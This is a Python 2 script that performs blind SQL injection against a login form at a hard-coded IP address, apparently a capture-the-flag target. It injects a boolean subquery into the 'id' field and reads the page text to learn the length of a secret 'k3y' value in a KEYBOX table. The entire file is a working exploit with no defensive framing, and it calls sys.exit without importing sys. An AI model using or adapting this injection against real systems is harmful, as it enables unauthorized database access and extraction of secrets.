#!/usr/bin/env python

import urllib2
import urllib
import string
import time

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"

headers = {
	'User-Agent': user_agent
}
url = "http://125.131.189.33:10105/web_basic_ok.php"
password = ""

candidate = list(string.printable)[:-5]
def make_query(length):
	return """admin' AND (SELECT LENGTH(`k3y`) FROM KEYBOX LIMIT 1)=""" + str(length) + """ OR '1'='2"""

def query(length):
	sql = make_query(length)
	post_data = urllib.urlencode({
		"id": sql,
		"pw": "11111"
	})
	print sql


	req = urllib2.Request(url, post_data, headers)
	fp = urllib2.urlopen(req)
	s = fp.read()
	fp.close()
	if "Mr" in s:
		return "true"
	elif "Please" in s:
		return "false"
	else:
		return "error"


for length in range(1, 1231):
	print "Querying... " + str(length)
	ret = query(length)
	time.sleep(0.2)
	if ret == "true":
		print "Length is " + str(length)
		sys.exit()
	elif ret == "false":
		print "Not"
	elif ret == "error":
		print "What the hell?!"
